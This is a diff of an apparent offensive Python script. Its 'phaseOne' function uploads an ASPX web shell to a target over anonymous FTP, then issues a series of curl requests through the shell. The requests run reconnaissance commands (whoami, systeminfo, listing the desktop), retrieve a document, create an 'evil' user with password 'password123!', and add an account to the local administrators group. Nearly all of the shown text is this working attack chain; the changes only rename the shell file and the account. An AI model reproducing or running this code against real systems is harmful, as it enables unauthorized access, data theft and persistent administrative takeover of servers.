@@ -71,7 +71,7 @@ def phaseOne():
 	quote PASS anonymous@
 	cd uploads
 	ls
-	put IPDS-Schema.aspx
+	put sudowoodo.aspx
 	quit
 	"""
 	subprocess.run(["ftp", "-n", target_ip], input=ftp_script, text=True)
@@ -84,17 +84,17 @@ def phaseOne():
 	#Add evil admin account with password123! as  the password.
 	addEvilAdmin = "net%20user%20%2Fadd%20evil%20password123%21"
 	# Add evil admin to administrators group
-	addAdminGroup = "net%20localgroup%20administrators%20evil%20%2Fadd"
+	addAdminGroup = "net%20localgroup%20administrators%20yujiro%2Ehanma%20%2Fadd"
 	systeminfo = "systeminfo"
 	log_event(f"initiation curl command injections against {target_ip}!")
 	# Set up URL Encoded curl requests
-	#curlone = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={whoami}"
-	#curltwo = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={dir}"
-	#curlthree = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={listDesktop}"
-	#curlfour = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={getDocument}"
-	#curlfive = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={addEvilAdmin}"
-	#curlsix = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={addAdminGroup}"
-	#curlseven = f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={systeminfo}"
+	#curlone = f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={whoami}"
+	#curltwo = f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={dir}"
+	#curlthree = f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={listDesktop}"
+	#curlfour = f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={getDocument}"
+	#curlfive = f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={addEvilAdmin}"
+	#curlsix = f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={addAdminGroup}"
+	#curlseven = f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={systeminfo}"
 	# Execute requests
 	#subprocess.run(curlone, shell=True, text=True)
 	#subprocess.run(curltwo, shell=True, text=True)
@@ -103,13 +103,13 @@ def phaseOne():
 	#subprocess.run(curlfive, shell=True, text=True)
 	#subprocess.run(curlsix, shell=True, text=True)	
 	commands = [
-	f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={whoami}",
-	f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={pwd}",
-	f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={listDesktop}",
-	f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={getDocument}",
-	f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={addEvilAdmin}",
-	f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={addAdminGroup}",
-	f"curl http://{target_ip}/uploads/IPDS-Schema.aspx?cmd={systeminfo}"
+	f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={whoami}",
+	f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={pwd}",
+	f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={listDesktop}",
+	f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={getDocument}",
+	f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={addEvilAdmin}",
+	f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={addAdminGroup}",
+	f"curl http://{target_ip}/uploads/Sudowoodo.aspx?cmd={systeminfo}"
 	]
 
 	# Execute requests using a for loop
